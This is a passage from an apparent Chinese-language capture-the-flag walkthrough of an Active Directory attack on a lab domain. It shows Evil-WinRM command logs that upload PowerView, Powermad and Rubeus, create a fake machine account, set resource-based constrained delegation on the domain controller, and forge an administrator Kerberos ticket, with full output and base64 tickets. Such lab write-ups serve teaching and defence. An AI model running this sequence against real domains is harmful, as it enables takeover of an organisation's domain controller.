Evil-WinRM GitHub: https:<span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\support\Documents&gt; cd ../Desktop<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; upload /home/kali/Desktop/tools/PowerSploit/PowerView.ps1<br>                                        <br>Info: Uploading /home/kali/Desktop/tools/PowerSploit/PowerView.ps1 to C:\Users\support\Desktop\PowerView.ps1<br>                                        <br>Data: <span class="hljs-number">1027036</span> bytes of <span class="hljs-number">1027036</span> bytes copied<br>                                        <br>Info: Upload successful!<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; upload /home/kali/Desktop/tools/Powermad/Powermad.ps<br>/home/kali/Desktop/tools/Powermad/Powermad.ps1  /home/kali/Desktop/tools/Powermad/Powermad.psd1 /home/kali/Desktop/tools/Powermad/Powermad.psm1<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; upload /home/kali/Desktop/tools/Powermad/Powermad.ps1<br>                                        <br>Info: Uploading /home/kali/Desktop/tools/PowerSploit<span class="hljs-comment">//home/kali/Desktop/tools/Powermad/Powermad.ps1 to C:\Users\support\Desktop\Powermad.ps1</span><br>                                        <br>Error: Upload failed. Check filenames or paths: No such file or directory - No such file or directory /home/kali/Desktop/tools/PowerSploit/home/kali/Desktop/tools/Powermad/Powermad.ps1<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; upload ../Powermad/Powermad.ps1<br>                                        <br>Info: Uploading /home/kali/Desktop/tools/PowerSploit/../Powermad/Powermad.ps1 to C:\Users\support\Desktop\Powermad.ps1<br>                                        <br>Data: <span class="hljs-number">180768</span> bytes of <span class="hljs-number">180768</span> bytes copied<br>                                        <br>Info: Upload successful!<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; upload /home/kali/Desktop/tools/Rubeus/Rubeus.exe<br>                                        <br>Info: Uploading /home/kali/Desktop/tools/PowerSploit<span class="hljs-comment">//home/kali/Desktop/tools/Rubeus/Rubeus.exe to C:\Users\support\Desktop\Rubeus.exe</span><br>                                        <br>Error: Upload failed. Check filenames or paths: No such file or directory - No such file or directory /home/kali/Desktop/tools/PowerSploit/home/kali/Desktop/tools/Rubeus/Rubeus.exe<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; upload ../Rubeus/Rubeus.exe<br>                                        <br>Info: Uploading /home/kali/Desktop/tools/PowerSploit/../Rubeus/Rubeus.exe to C:\Users\support\Desktop\Rubeus.exe<br>                                        <br>Data: <span class="hljs-number">369320</span> bytes of <span class="hljs-number">369320</span> bytes copied<br>                                        <br>Info: Upload successful!<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; dir<br><br><br>    Directory: C:\Users\support\Desktop<br><br><br>Mode                 LastWriteTime         Length Name<br>----                 -------------         ------ ----<br>-a----         <span class="hljs-number">3</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">7</span>:<span class="hljs-number">50</span> PM         <span class="hljs-number">135576</span> Powermad.ps1<br>-a----         <span class="hljs-number">3</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">7</span>:<span class="hljs-number">44</span> PM         <span class="hljs-number">770279</span> PowerView.ps1<br>-a----         <span class="hljs-number">3</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">7</span>:<span class="hljs-number">59</span> PM         <span class="hljs-number">276992</span> Rubeus.exe<br>-ar---         <span class="hljs-number">3</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">6</span>:<span class="hljs-number">29</span> PM             <span class="hljs-number">34</span> user.txt<br><br><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; <br><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; Import-Module ./Powermad.ps1<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; Import-Module ./PowerView.ps1<br></code></pre></td></tr></table></figure>

<p>23、我将验证用户是否可以将计算机添加到域中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\support\Desktop&gt; Get-DomainObject -Identity <span class="hljs-string">&#x27;DC=SUPPORT,DC=HTB&#x27;</span> | select ms-ds-machineaccountquota<br><br>ms-ds-machineaccountquota<br>-------------------------<br>                       <span class="hljs-number">10</span><br><br><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; <br></code></pre></td></tr></table></figure>

<p>24、我还需要确保环境中有 2012 年以上的 DC：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\support\Desktop&gt; Get-DomainController | select name,osversion | fl<br><br><br>Name      : dc.support.htb<br>OSVersion : Windows Server <span class="hljs-number">2022</span> Standard<br><br><br><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; <br></code></pre></td></tr></table></figure>

<p>25、最后，我想检查是否msds-allowedtoactonbehalfofotheridentity为空：</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c#">*Evil-WinRM* PS C:\Users\support\Desktop&gt; Get-DomainComputer DC | <span class="hljs-keyword">select</span> name,msds-allowedtoactonbehalfofotheridentity | fl<br><br><br>name                                     : DC<br>msds-allowedtoactonbehalfofotheridentity :<br><br><br><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; <br></code></pre></td></tr></table></figure>

<p>26、创建假计算机，我将使用 PowermadNew-MachineAccount来创建一台假计算机：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\support\Desktop&gt; New-MachineAccount -MachineAccount <span class="hljs-number">0xdfFa</span>keComputer -Password $(ConvertTo-SecureString <span class="hljs-string">&#x27;0xdf0xdf123&#x27;</span> -AsPlainText -Force)<br>[+] Machine account <span class="hljs-number">0xdfFa</span>keComputer added<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; <br></code></pre></td></tr></table></figure>

<p>27、我还需要计算机对象的 SID，因此我将其保存在变量中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\support\Desktop&gt; $fakesid = Get-DomainComputer <span class="hljs-number">0xdfFa</span>keComputer | select -expand objectsid<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; $fakesid<br>S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-1677581083</span><span class="hljs-number">-3380853377</span><span class="hljs-number">-188903654</span><span class="hljs-number">-5601</span><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; <br></code></pre></td></tr></table></figure>

<p>28、攻击现在，我将配置 DC 以信任我的假计算机代表它做出授权决策。这些命令将使用假计算机的 SID 创建 ACL 并将其分配给 DC：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\support\Desktop&gt; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))&quot;</span><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; $SDBytes = New-Object byte[] ($SD.BinaryLength)<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; $SD.GetBinaryForm($SDBytes, <span class="hljs-number">0</span>)<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; Get-DomainComputer $TargetComputer | Set-DomainObject -Set @&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=$SDBytes&#125; <br>Warning: [Set-DomainObject] Error setting/replacing properties <span class="hljs-keyword">for</span> object <span class="hljs-string">&#x27;MANAGEMENT$&#x27;</span> : Exception calling <span class="hljs-string">&quot;CommitChanges&quot;</span> with <span class="hljs-string">&quot;0&quot;</span> argument(s): <span class="hljs-string">&quot;Access is denied.</span><br><span class="hljs-string">&quot;</span><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; <br></code></pre></td></tr></table></figure>

<p>29、我将验证它是否有效：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\support\Desktop&gt; $RawBytes = Get-DomainComputer DC -Properties <span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span> | select -expand msds-allowedtoactonbehalfofotheridentity<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, <span class="hljs-number">0</span><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; $Descriptor.DiscretionaryAcl<br><br><br>BinaryLength       : <span class="hljs-number">36</span><br>AceQualifier       : AccessAllowed<br>IsCallback         : False<br>OpaqueLength       : <span class="hljs-number">0</span><br>AccessMask         : <span class="hljs-number">983551</span><br>SecurityIdentifier : S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-1677581083</span><span class="hljs-number">-3380853377</span><span class="hljs-number">-188903654</span><span class="hljs-number">-5601</span><br>AceType            : AccessAllowed<br>AceFlags           : None<br>IsInherited        : False<br>InheritanceFlags   : None<br>PropagationFlags   : None<br>AuditFlags         : None<br><br><br><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; <br></code></pre></td></tr></table></figure>

<p>30、我的假计算机有一个 ACL，SecurityIdentifier上面写着AccessAllowed。验证为假计算机，我将用来Rubeus获取我的假计算机帐户的哈希值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\support\Desktop&gt; .\Rubeus.exe hash /password:<span class="hljs-number">0xdf0</span>xdf123 /user:<span class="hljs-number">0xdfFa</span>keComputer /domain:support.htb<br><br>   ______        _<br>  (_____ \      | |<br>   _____) )_   _| |__  _____ _   _  ___<br>  |  __  /| | | |  _ \| ___ | | | |/___)<br>  | |  \ \| |_| | |_) ) ____| |_| |___ |<br>  |_|   |_|____/|____/|_____)____/(___/<br><br>  v1<span class="hljs-number">.6</span><span class="hljs-number">.4</span><br><br><br>[*] Action: Calculate Password Hash(es)<br><br>[*] Input password             : <span class="hljs-number">0xdf0</span>xdf123<br>[*] Input username             : <span class="hljs-number">0xdfFa</span>keComputer<br>[*] Input domain               : support.htb<br>[*] Salt                       : SUPPORT.HTB0xdffakecomputer<br>[*]       rc4_hmac             : B1809AB221A7E1F4545BD9E24E49D5F4<br>[*]       aes128_cts_hmac_sha1 : F7A01B9628299B9FB8A93CFCCF8E747C<br>[*]       aes256_cts_hmac_sha1 : <span class="hljs-number">90499</span>A3696F8B07B9CDB02E919F193768519340F7812F6050177E6997262B6F0<br>[*]       des_cbc_md5          : <span class="hljs-number">76</span>EF4F97ADD99176<br><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; <br></code></pre></td></tr></table></figure>

<p>31、我需要标记为 的那个rc4_hmac，我将把它传递给Rubeus管理员以获得一张票：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\support\Desktop&gt; .\Rubeus.exe s4u /user:<span class="hljs-number">0xdfFa</span>keComputer$ /rc4:B1809AB221A7E1F4545BD9E24E49D5F4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt<br><br>   ______        _<br>  (_____ \      | |<br>   _____) )_   _| |__  _____ _   _  ___<br>  |  __  /| | | |  _ \| ___ | | | |/___)<br>  | |  \ \| |_| | |_) ) ____| |_| |___ |<br>  |_|   |_|____/|____/|_____)____/(___/<br><br>  v1<span class="hljs-number">.6</span><span class="hljs-number">.4</span><br><br>[*] Action: S4U<br><br>[*] Using rc4_hmac hash: B1809AB221A7E1F4545BD9E24E49D5F4<br>[*] Building AS-REQ (w/ preauth) <span class="hljs-keyword">for</span>: <span class="hljs-string">&#x27;support.htb\0xdfFakeComputer$&#x27;</span><br>[+] TGT request successful!<br>[*] base64(ticket.kirbi):<br><br>      doIFvjCCBbqgAwIBBaEDAgEWooIEzTCCBMlhggTFMIIEwaADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD<br>      AgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBIcwggSDoAMCARKhAwIBAqKCBHUEggRx2rT/vWFT<br>      Z7DGr713wbsTWKklBoxuLSIw7NlT3hHbA81Fi4HBXvNWDYnh2bBvjqv3dsieIxUlvAVRUyw8eDa/HL3Q<br>      Vtr125qOiUWRaeDXhLX0W5YJyCSzgHQHPwF7Sy9ajE9WuZCR9zKwuAKRj5hSYUXMGgIaLj157QA0BXVJ<br>      z9YHY67el4ajF/DzB4E9wxs0+rP4nEVqtOGJ3RQu0tAQ29TWoHAy7JDL83tUjigkjL5NxNwzE6YfbOCM<br>      iTZw6AcA1H4CNv3L9/aqZUtihqC9fh7pyf+<span class="hljs-number">6</span>nRcnJnUwXykqFBX4LKUm85eAdBm9sWtFCxoEbn89AMNY<br>      <span class="hljs-number">7</span>YytepyvZvY2HwH9QkpORyBp+Q2h2TX1khxyXc1vVbQc7zfj2rTjNYzxuStRkTuVGr0GtehYVi5PE8L2<br>      VY4sGjyKAycKyGM2brtBzQ2aVjFT/xqQENSZ3EzeLqlSNNW4zYjqFPVv2j7iqxkfQcc3Z8Rq8Zzpv2eu<br>      DuNrBU61Ys8OESetuAnjiHCIQ4VaguUh7aqS3YL57IQPy0QWMiqanOduMbPmtKD5KVrqddwIgQ7J28vD<br>      ax2u/eq5Ekkun7noO82Cwju2SPgH8dFcjti2b4XsSgMcSkRy76V4EMetoIG/<span class="hljs-number">8</span>yZNxaQwB7B+Rc7nubpN<br>      QHgiQy5IRQlDuIZ5yX65WE4M/m1j3QcRF/<span class="hljs-number">2</span>Aah61ccs+bmOiGe7tLvIEn9gVj3GVm0RbcdAEs/z9fhoK<br>      azb34cFE33r8WNNKEG9jGnRvY7H62iphGfItJZMGWkTS+Nf1WhLpN/xA/qqUuIgT0XmL3olBVmWWOmdI<br>      mYbINItObha+<span class="hljs-number">5</span>rnMINNadXek6fH5m+XDKu/Pg7ncng7nL1kwMjmqVUBfHUjvaukbpMhEwRUQOmhhQi60<br>      <span class="hljs-number">7</span>vinZ6zdxwZCz+AfBd/<span class="hljs-number">9</span>YTKBj6J/R8s5PJRHT4ysp6ZzWS4c2GqE3+YZAQGB6nLfcD9Doqfg1WhLjpEm<br>      +<span class="hljs-number">1</span>MHNvDsVDNm4S5/JFAVysI/ngG8O8Q2pRqdI9bdpa2Oql5vmAm3vWMtPhcKkFf03Q801Bv0cAAhWKRC<br>      SaZjYVwwGxCSywgdu9ubN05FFSgEKphH2I9uhE6OZvuKi8aBR+<span class="hljs-number">2</span>cHmytSxxkK+ExkkADInhD3Nl0EcVb<br>      <span class="hljs-number">5</span>hWEPzOneooBXWp4uA0nySfWVPghdZI/w9RlsU4tFNRwkuw4UNokYlPFL8vFoPyhO0aU3zXcFQdfw/OM<br>      ROCXx86c12QOR/<span class="hljs-number">3</span>kSrB9Y+u0oZvg+gWVOUyCMmodQ/LKO67Wrk9auHXOKsj1px5bpaBNQLcndRLJY9GP<br>      kIBqtBpXE2hwNafKve0vKfFOqj16laow2K+mN/l1cPwVIiR0uLiwfjYPMU/th7+LH2gPb1rV1g/OKBJW<br>      z4fGIY3tEmKZiM7js9fudITTwbz7TwP1uAzru2wyJKhj61BgkSdRTduoXFLEAGfuD9acf/nnzMmf6NRo<br>      S0QdaliUKZKvwWBBgpVOa0jZvfG46NVrOzOt/a1PmmCK81d8vSh5csC1Yob01Ba5Rmgbo4HcMIHZoAMC<br>      AQCigdEEgc59gcswgciggcUwgcIwgb+gGzAZoAMCARehEgQQEv8SLEiw3b2oguzZg5NtpqENGwtTVVBQ<br>      T1JULkhUQqIeMBygAwIBAaEVMBMbETB4ZGZGYWtlQ29tcHV0ZXIkowcDBQBA4QAApREYDzIwMjQwMzIx<br>      MDMyMzI1WqYRGA8yMDI0MDMyMTEzMjMyNVqnERgPMjAyNDAzMjgwMzIzMjVaqA0bC1NVUFBPUlQuSFRC<br>      qSAwHqADAgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0Yg==<br><br><br>[*] Action: S4U<br><br>[*] Using domain controller: dc.support.htb (::<span class="hljs-number">1</span>)<br>[*] Building S4U2self request <span class="hljs-keyword">for</span>: <span class="hljs-string">&#x27;0xdfFakeComputer$@SUPPORT.HTB&#x27;</span><br>[*] Sending S4U2self request<br>[+] S4U2self success!<br>[*] Got a TGS <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;administrator&#x27;</span> to <span class="hljs-string">&#x27;0xdfFakeComputer$@SUPPORT.HTB&#x27;</span><br>[*] base64(ticket.kirbi):<br><br>      doIFtjCCBbKgAwIBBaEDAgEWooIEyzCCBMdhggTDMIIEv6ADAgEFoQ0bC1NVUFBPUlQuSFRCoh4wHKAD<br>      AgEBoRUwExsRMHhkZkZha2VDb21wdXRlciSjggSHMIIEg6ADAgEXoQMCAQGiggR1BIIEcUsqfqtDBjH5<br>      gvs6fZzyNI/ps53Euq9wHQbAr2b4viNYhY+<span class="hljs-number">1</span>gcbmm1YqiMzWjhM5sYx8tNgDJ7tb5nYkCiZK1M42NRXC<br>      te+jLtY9Ehd7zT687SDzzYzelki0LVSU2LoU+Y2c73EaQaIJPpr+reCKv0HF3PfnIwRzHp7EfEnPy+<span class="hljs-number">5l</span><br>      dvoDYCYCJVJ7qD5sPqjl+DTARModRPgr/BMm0IRISLfsZY6u21k3Go/mK8LuxPXj1BQuMVl98BEDjsi8<br>      y6UXe/vJELxOFqTkeM9dp9tz3KdoDxt7AnadFaGABt6UcsiCMsH/QFb/TM5jx++<span class="hljs-number">0</span>mDRCap2JOWbsL6bX<br>      dupLiETzxbHDfWcpOclBN81Rqn0T83jFNi4uu2GdZpXhLX2XIK/rx2rxrQv94oo88o+xeujiD621x+<span class="hljs-number">4</span>o<br>      <span class="hljs-number">2</span>IHuY6hhbhRec6v4iKA98mwc3GEximMX8sexqsZbt6ahnZWWxOWpuesHjGBtMeouza2ERl4lGSNjcAg0<br>      uLMDh86qOiCREYcyZk3gHsihWl/UIUOz45wbAf6vPF5efDr5hm0ml6rdp5CWWlun/<span class="hljs-number">1</span>AkbeyskMRr0Aa4<br>      L84Xk+ILaBen1wn6MnpG/<span class="hljs-number">2</span>gE+<span class="hljs-number">3</span>IPt/lVooBs8avcg/<span class="hljs-number">9L</span>+MzJPVOJKIoncw8q9DlDZlD3IXEORguSR4x8<br>      /+<span class="hljs-number">2</span>Hu6nxF9K1aZAzKMYortaK/OqzbzprpLV8XKw/<span class="hljs-number">7</span>/OTJbk+dSYUcvRLE4TKl2uBrZR60kd4uI6ft2KO<br>      ePWYedjasM9/M7CdXVG6hBRU6RRx9ygXkoltGFssj+RVWqRevBPvPEmNO9QUueim7Wp156kBGxuFN/rr<br>      <span class="hljs-number">9</span>tsL8DQStQABH4CdDMKonGrzYhC43G/<span class="hljs-number">7b</span>xVYkBYqKcbQ68DaSBmsHit7Wpk4kneLEichaUWeuQxfXgmG<br>      UGoBSx3tkNOTs6XNyO+S4uRReVOy12rxzWkvUX0HycrtDNh3XxiTzD2CnVZW9STPGdREkJX5bK8w9oo4<br>      Ctdtv1VznBsR19wXUlFO0rtf7CcnnoOoBYUWXx5BcJHK7Xfj0YklPAuHpm0UM/Aj42OLGUQ5A/RDiNZW<br>      I0xX1y6CiebK/cBJRZrCW0JbGi0BdP+/vP8P7PqsN7L+<span class="hljs-number">7</span>m0UjhRx9tNvBIj7do5xzUIx8XKobLai+OJX<br>      <span class="hljs-number">4</span>wu8nuqEzl3DEkxHjFqSbNoRqenrBJXbHZwxkwlGpvmMLlrbxioGJpniA1bKtYqXsis0IZw5rRR/z1nf<br>      EbIbp3T3KaNd9vgglWrRM4e3U5XgKIwtSYLjo4/fac+e1L5+SKByDsySMExqIITua0O0LgNvdN0bVCUz<br>      <span class="hljs-number">7</span>SxTkVi2ruJBBlNki6IQ439FyFY9wGORgMRWrtAZjlDp2adr28t+Kb+gBmaUV8ZrsNu+<span class="hljs-number">6L</span>AAvBSGiOAN<br>      <span class="hljs-number">1</span>QL/zCEpBuxt3MxH1vLSznKJpkoWL70pBV2xi5FD+MoXrFCFCply9lNSDgflXaBcDkOCIkn6d7OQrR0p<br>      <span class="hljs-number">4</span>YPcf4vgvce/nG9cq5XlufrlNMGEYwptvW0rmOlWddXvElc2yCiG2QrqwzCqvHlpa6OB1jCB06ADAgEA<br>      ooHLBIHIfYHFMIHCoIG/MIG8MIG5oBswGaADAgEXoRIEEE8hAezCHlYBuvR6V11OWxmhDRsLU1VQUE9S<br>      VC5IVEKiGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJhdG9yowcDBQBAoQAApREYDzIwMjQwMzIxMDMyMzI1<br>      WqYRGA8yMDI0MDMyMTEzMjMyNVqnERgPMjAyNDAzMjgwMzIzMjVaqA0bC1NVUFBPUlQuSFRCqR4wHKAD<br>      AgEBoRUwExsRMHhkZkZha2VDb21wdXRlciQ=<br><br>[*] Impersonating user <span class="hljs-string">&#x27;administrator&#x27;</span> to target SPN <span class="hljs-string">&#x27;cifs/dc.support.htb&#x27;</span><br>[*] Using domain controller: dc.support.htb (::<span class="hljs-number">1</span>)<br>[*] Building S4U2proxy request <span class="hljs-keyword">for</span> service: <span class="hljs-string">&#x27;cifs/dc.support.htb&#x27;</span><br>[*] Sending S4U2proxy request<br>[+] S4U2proxy success!<br>[*] base64(ticket.kirbi) <span class="hljs-keyword">for</span> SPN <span class="hljs-string">&#x27;cifs/dc.support.htb&#x27;</span>:<br><br>      doIGeDCCBnSgAwIBBaEDAgEWooIFijCCBYZhggWCMIIFfqADAgEFoQ0bC1NVUFBPUlQuSFRCoiEwH6AD<br>      AgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGKjggVDMIIFP6ADAgESoQMCAQaiggUxBIIFLdl/qG40<br>      gcsNpX8Rh+mHIGO0bQplyoBKiGT4Z5iRVuRTwN6Sngnd6xVjrbrdeSsjIBSTJ84agB8Ve1qU3xJknelB<br>      Wyh5bXb5uyYJT9ysg5el80LbQ3YpK0An3uyzNmcF77G2CZhqBedgyej07rXN8o0CAPqUop+MlHKFYIAr<br>      vjc42Dr9nUhm7EjyAU0g4AABSNmRvun3v6VwEMrPS5gkRlOr6DTr5vYgYuJh/<span class="hljs-number">0</span>NexuOVNJxduLBOnCZP<br>      tAzNMnjD0skwZjCDL7G30/X5I5+IZWLT/DLQxwWwaOr0IWgHEcCspIINkrJYWPPt8ArH+VVh8aWaaFIE<br>      t1w460yi2a8tcNGkNF0u951onhzB9UoHKzvn7QmRU1MOLHChWmQUXkvvNFJ6oGopExUQSXw+OAwTIwsl<br>      AiF6ldaRTU2o6ArG6msWahXRHaSzOPb7iWArNQq0zYEFlD2E1FrYfKcC5aFzn3ePP5ssYdYcp63LcKix<br>      CJTh/qZB68qNjg9ojiny8izrrB9EtiPyxWirRfP7TMRsivIKWte4r8LQkmo00nj1agPFWopWq6htJiqz<br>      au4InVdRFVSiOqZWB6+EgNDdIXrtv238NJkxVxI88Tdpe5UwKal/Qxp2kF06JbEYpW39QqqWfkUXOVOa<br>      jUitcFjas1Nqv9r7d3MxdIQ9wg07E8Lc4Wi0I0ab6sYNNpu8gECV7IZ7ABCWg5TqXguQyoGheDcyXwSa<br>      K8iw2oI2XDasojZeEw3U1NXJ2R1jq349IPtKyi44O4a/<span class="hljs-number">8</span>GoYgBzHoa8HaBff/xqGxSLcB/yNIbXJhtEn<br>      O2jZ5fLUuJGnsWUljeaynPqpsd4m6eFqYVk4lOCvkPfeIS4X6WukBouImCv/deUpmp+wNNuRdtqHIus+<br>      io8UtPD+Jiw+<span class="hljs-number">1</span>tZEY/rKBaroKAif1wItKt6x6Dyikw6UEuwVVins+<span class="hljs-number">9</span>HnFlXowTcd/VTBn1vrw7X1YneW<br>      RRjwggPUK/IyNVJdz297734S42WniKtokeDfJf4IFlM3THTyVMrIfnW4kiaBycFFqgg+T1gT4Rvn2MAX<br>      UmUVRRUX02iKy3eV2Rzt6qHryRUymamULt46/Xq1heCqkqk6ss8WLpRtkxTUj61KRIYa3nHaZuCEkujq<br>      FLMD7Oy5K5/buD4J8MPdMuDYIapKvVFqiAixFGEq+F67mOkaHcwFQOUyWsXSMHW0yMg7fdtj6LmW9Spj<br>      IDfx5JwZAegL/KMv9SiO1PAe3tR0fG3YxxtVUq98iXGIDqOc8CFLZ5mHzUU3OMhx45s3VHUBAEuNI8vC<br>      PxNgoSsfA8pBDbNT+<span class="hljs-number">4</span>jyR7gSmaYSIFYpDBZg8ji4C/sz1TXW+<span class="hljs-number">7</span>JoS3hxzfnpdrP/qYH6cT3LI5Vn6V6x<br>      <span class="hljs-number">1</span>ZOLEhNS9yzuMK/r+wB9F2GRMi6vA2OcttLw1kX/<span class="hljs-number">1u</span>SMEnuDrcwfyiyU/<span class="hljs-number">8</span>M4sB7oUH+m4w79rKmEvaeQ<br>      <span 